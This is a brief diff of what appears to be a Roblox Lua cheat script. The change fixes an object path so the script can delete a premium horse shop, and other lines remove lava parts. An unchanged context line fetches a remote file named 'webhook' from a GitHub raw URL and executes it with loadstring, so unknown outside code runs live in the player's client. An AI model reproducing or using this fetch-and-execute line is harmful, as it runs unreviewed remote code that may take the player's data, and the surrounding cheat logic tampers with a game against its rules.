@@ -235,5 +235,5 @@ end)
 loadstring(game:HttpGet('https://raw.githubusercontent.com/obeseid/Lellelelebonczki/refs/heads/main/webhook'))()
 -- Remove parts
 workspace.Islands:WaitForChild("Volcano Island"):WaitForChild("LavaParts"):Destroy()
-workspace.Islands:FindFirstChild(currentIsland):WaitForChild("Horse Sale Barn"):WaitForChild("PremiumHorseShop"):Destroy()
+workspace.Islands:FindFirstChild(currentIsland):WaitForChild("Buildings"):WaitForChild("Horse Sale Barn"):WaitForChild("PremiumHorseShop"):Destroy()
 
